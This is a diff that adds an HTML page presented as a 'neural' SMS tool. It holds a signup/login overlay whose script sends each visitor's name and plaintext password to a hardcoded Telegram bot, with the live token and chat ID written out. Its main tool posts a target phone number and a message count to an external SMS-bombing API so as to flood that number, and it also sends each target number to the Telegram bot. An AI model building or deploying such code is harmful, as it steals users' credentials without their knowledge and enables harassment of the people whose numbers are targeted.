@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>REHAN // NEURAL_MATRIX_v7.1_AI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #020205;
+            --primary-gradient: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            --secondary-gradient: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
+            --accent-gradient: linear-gradient(135deg, #f6d365 0%, #fda085 100%);
+            --text-main: #ffffff;
+            --text-muted: #8b9bb4;
+            --cyan-glow: #00f2fe;
+            --font-sans: 'Plus Jakarta Sans', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            font-family: var(--font-sans);
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: radial-gradient(circle at center, #101a33 0%, #020205 70%);
+        }
+
+        /* --- AUTH SYSTEM OVERLAY --- */
+        #auth-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bg-deep);
+            z-index: 9999; display: flex; align-items: center; justify-content: center;
+            padding: 20px; transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .auth-card {
+            width: 100%; max-width: 420px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 28px; padding: 35px;
+            backdrop-filter: blur(25px); text-align: center;
+            box-shadow: 0 0 50px rgba(0, 242, 254, 0.15);
+            animation: auth-slide-up 0.8s ease-out;
+        }
+
+        @keyframes auth-slide-up { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        .auth-title { 
+            font-size: 1.6rem; font-weight: 800; text-transform: uppercase; 
+            background: var(--primary-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 30px; letter-spacing: 2px;
+        }
+
+        .auth-input-group { margin-bottom: 18px; text-align: left; }
+        .auth-input-group label { font-size: 0.7rem; color: var(--text-muted); font-family: var(--font-mono); margin-left: 10px; letter-spacing: 1px; }
+        
+        .auth-input {
+            width: 100%; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 16px; border-radius: 14px; color: white; font-family: var(--font-mono); margin-top: 6px;
+            transition: 0.3s;
+        }
+        .auth-input:focus { border-color: var(--cyan-glow); outline: none; box-shadow: 0 0 15px rgba(0, 242, 254, 0.2); }
+
+        .auth-btn {
+            width: 100%; padding: 16px; margin-top: 25px; border-radius: 14px; border: none;
+            background: var(--primary-gradient); color: #000; font-weight: 800; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 2px; transition: 0.4s;
+        }
+        .auth-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0, 242, 254, 0.4); }
+
+        .switch-mode { margin-top: 25px; font-size: 0.85rem; color: var(--text-muted); }
+        .switch-mode span { color: var(--cyan-glow); cursor: pointer; font-weight: bold; text-decoration: underline; }
+
+        #auth-msg-s, #auth-msg-l { margin-top: 15px; font-size: 0.75rem; font-family: var(--font-mono); min-height: 18px; }
+        .msg-error { color: #ff0844; }
+        .msg-success { color: #00f2fe; }
+        .hidden { display: none !important; }
+
+        /* --- TOOL STYLES --- */
+        .ai-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.6; }
+        .synapse { position: absolute; width: 4px; height: 4px; background: var(--cyan-glow); border-radius: 50%; animation: synapse-pulse 4s infinite ease-in-out; }
+        .connection { position: absolute; height: 1px; background: linear-gradient(90deg, transparent, rgba(0, 242, 254, 0.2), transparent); animation: connection-swim 10s infinite linear; }
+        @keyframes synapse-pulse { 0%, 100% { transform: scale(1); opacity: 0.3; } 50% { transform: scale(1.5); opacity: 1; } }
+        @keyframes connection-swim { from { transform: translateX(-100%); } to { transform: translateX(100vw); } }
+
+        .quantum-container { width: 100%; max-width: 450px; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 24px; padding: 30px; backdrop-filter: blur(20px); position: relative; z-index: 10; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 1.8rem; font-weight: 800; text-transform: uppercase; background: var(--primary-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: flex; align-items: center; gap: 8px; font-size: 0.75rem; font-weight: 500; color: #a1a1aa; margin-bottom: 10px; text-transform: uppercase; font-family: var(--font-mono); }
+        .input-label::before { content: ""; width: 6px; height: 6px; background: var(--secondary-gradient); border-radius: 50%; }
+        input { width: 100%; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 16px; color: var(--text-main); font-family: var(--font-mono); }
+        .intensity-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 20px; }
+        .intensity-grid input { display: none; }
+        .intensity-label { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); padding: 14px; text-align: center; border-radius: 12px; cursor: pointer; color: var(--text-muted); font-size: 0.85rem; }
+        .intensity-grid input:checked + .intensity-label { background: var(--primary-gradient); color: #000; font-weight: 700; }
+        #trigger-btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--secondary-gradient); color: white; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        .terminal { margin-top: 25px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.05); height: 180px; border-radius: 12px; padding: 15px; overflow-y: auto; font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted); }
+        .term-entry { margin-bottom: 6px; animation: neural-burst 0.4s ease-out; }
+        .term-green { color: #00f2fe; font-weight: bold; }
+        .socials { display: flex; gap: 12px; width: 100%; max-width: 450px; margin: 20px 0; }
+        .social-link { flex: 1; text-align: center; padding: 14px; border-radius: 12px; text-decoration: none; font-size: 0.8rem; font-weight: 700; color: white; text-transform: uppercase; }
+        .link-wa { background: #25D366; }
+        .link-web { background: rgba(255,255,255,0.03); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .footer { margin-top: auto; padding: 20px 0; text-align: center; }
+        .owner-name { font-weight: 800; font-size: 1.1rem; background: var(--primary-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-overlay">
+        <div class="auth-card" id="signup-box">
+            <div class="auth-title">Neural Registration</div>
+            <div class="auth-input-group">
+                <label>FIRST NAME</label>
+                <input type="text" id="fname" class="auth-input" placeholder="e.g. Rehan">
+            </div>
+            <div class="auth-input-group">
+                <label>LAST NAME</label>
+                <input type="text" id="lname" class="auth-input" placeholder="e.g. Official">
+            </div>
+            <div class="auth-input-group">
+                <label>ACCESS KEY</label>
+                <input type="password" id="spass" class="auth-input" placeholder="Create Password">
+            </div>
+            <button class="auth-btn" onclick="handleSignup()">Establish Identity</button>
+            <div id="auth-msg-s"></div>
+            <p class="switch-mode">Already registered? <span onclick="toggleAuth()">Login to Mainframe</span></p>
+        </div>
+
+        <div class="auth-card hidden" id="login-box">
+            <div class="auth-title">Neural Handshake</div>
+            <div class="auth-input-group">
+                <label>IDENTITY NAME</label>
+                <input type="text" id="login-user" class="auth-input" placeholder="Enter your First Name">
+            </div>
+            <div class="auth-input-group">
+                <label>ACCESS KEY</label>
+                <input type="password" id="login-pass" class="auth-input" placeholder="Enter Password">
+            </div>
+            <button class="auth-btn" onclick="handleLogin()">Authorize Access</button>
+            <div id="auth-msg-l"></div>
+            <p class="switch-mode">New node? <span onclick="toggleAuth()">Register New Identity</span></p>
+        </div>
+    </div>
+
+    <div class="ai-bg" id="ai-bg">
+        <div class="synapse" style="top: 20%; left: 10%;"></div>
+        <div class="synapse" style="top: 60%; left: 85%;"></div>
+        <div class="connection" style="top: 30%; width: 100%;"></div>
+    </div>
+
+    <div class="socials">
+        <a href="https://wa.me/923116071073" class="social-link link-wa">Connect Neural Core</a>
+        <a href="#" class="social-link link-web">Mainframe</a>
+    </div>
+
+    <div class="quantum-container">
+        <div class="header">
+            <h1>⫷ REHAN 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 ⫸</h1>
+        </div>
+        <div class="input-group">
+            <div class="input-label">Target Neural Node</div>
+            <input type="tel" id="target-num" placeholder="03XXXXXXXXX">
+        </div>
+        <div class="input-group">
+            <div class="input-label">Intensity</div>
+            <div class="intensity-grid">
+                <input type="radio" id="p1" name="amt" value="10" checked><label for="p1" class="intensity-label">10 Packets</label>
+                <input type="radio" id="p2" name="amt" value="25"><label for="p2" class="intensity-label">25 Packets</label>
+                <input type="radio" id="p3" name="amt" value="50"><label for="p3" class="intensity-label">50 Packets</label>
+                <input type="radio" id="p4" name="amt" value="manual"><label for="p4" class="intensity-label">AI Max</label>
+            </div>
+        </div>
+        <button id="trigger-btn">Initialize Broadcast</button>
+        <div class="terminal" id="term-box">
+            <div class="term-entry">STATUS: System Ready...</div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="owner-name">⫷REHAN 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 ⫸</p>
+    </div>
+
+    <script>
+        // --- CONFIG ---
+        const TG_TOKEN = "8680607998:AAFGHDWEx8iTPCN8yDMEjm4UCrjh_DzNxBo";
+        const TG_CHAT_ID = "7969358399";
+
+        // Improved notification function for web hosting
+        function notify(msg) {
+            const text = encodeURIComponent(msg);
+            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+            
+            // Beacon + Fetch for maximum reliability
+            fetch(url, { mode: 'no-cors' }).catch(() => {
+                let img = new Image();
+                img.src = url;
+            });
+        }
+
+        function toggleAuth() {
+            document.getElementById('signup-box').classList.toggle('hidden');
+            document.getElementById('login-box').classList.toggle('hidden');
+        }
+
+        function handleSignup() {
+            const f = document.getElementById('fname').value.trim();
+            const l = document.getElementById('lname').value.trim();
+            const p = document.getElementById('spass').value.trim();
+            const msg = document.getElementById('auth-msg-s');
+
+            if(!f || !p) {
+                msg.innerHTML = "<span class='msg-error'>[!] All fields are required.</span>";
+                return;
+            }
+
+            localStorage.setItem(`user_${f.toLowerCase()}`, JSON.stringify({name: f, last: l, pass: p}));
+            notify(`🆕 **SIGNUP ALERT**\n👤 Name: ${f} ${l}\n🔑 Key: ${p}`);
+            msg.innerHTML = "<span class='msg-success'>[+] Identity Registered. Switch to Login.</span>";
+            setTimeout(toggleAuth, 1500);
+        }
+
+        function handleLogin() {
+            const u = document.getElementById('login-user').value.trim().toLowerCase();
+            const p = document.getElementById('login-pass').value.trim();
+            const msg = document.getElementById('auth-msg-l');
+            const data = localStorage.getItem(`user_${u}`);
+
+            if(data) {
+                const user = JSON.parse(data);
+                if(user.pass === p) {
+                    notify(`✅ **LOGIN SUCCESS**\n👤 User: ${user.name}`);
+                    msg.innerHTML = "<span class='msg-success'>[+] Access Granted. Loading...</span>";
+                    setTimeout(() => {
+                        document.getElementById('auth-overlay').style.opacity = '0';
+                        setTimeout(() => document.getElementById('auth-overlay').style.display = 'none', 600);
+                    }, 1000);
+                } else { msg.innerHTML = "<span class='msg-error'>[!] Incorrect Key.</span>"; }
+            } else { msg.innerHTML = "<span class='msg-error'>[!] Node not found.</span>"; }
+        }
+
+        const DOM = { num: document.getElementById('target-num'), btn: document.getElementById('trigger-btn'), term: document.getElementById('term-box') };
+        let active = false;
+
+        function addTerm(m, type = '') {
+            const div = document.createElement('div');
+            div.className = `term-entry ${type}`;
+            div.innerHTML = `<span style="color:#555;">[${new Date().toLocaleTimeString().split(' ')[0]}]</span> ${m}`;
+            DOM.term.appendChild(div);
+            DOM.term.scrollTop = DOM.term.scrollHeight;
+        }
+
+        async function launch() {
+            const target = DOM.num.value;
+            const amt = document.querySelector('input[name="amt"]:checked').value;
+            const count = amt === 'manual' ? 100 : parseInt(amt);
+
+            if (target.length < 10) {
+                addTerm("CRITICAL: Invalid Format.", "term-red");
+                return;
+            }
+
+            active = true;
+            DOM.btn.textContent = "STOPPING...";
+            addTerm(`STREAM: Sending ${count} Packets to ${target}...`);
+            notify(`📩 **BOMBER USED**\n📱 Target: ${target}\n📊 Count: ${count}`);
+
+            try {
+                const res = await fetch("https://sms-bmb-api.fakcloud.tech/", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ number: target, count: count })
+                });
+                const data = await res.json();
+                addTerm(`RESULT: ${data.Message || 'Packets Dispatched'}`, "term-green");
+            } catch (e) { addTerm("FATAL: Link Error.", "term-red"); } 
+            finally { active = false; DOM.btn.textContent = "Initialize Broadcast"; }
+        }
+
+        DOM.btn.addEventListener('click', () => { if(!active) launch(); else location.reload(); });
+    </script>
+</body>
+</html>
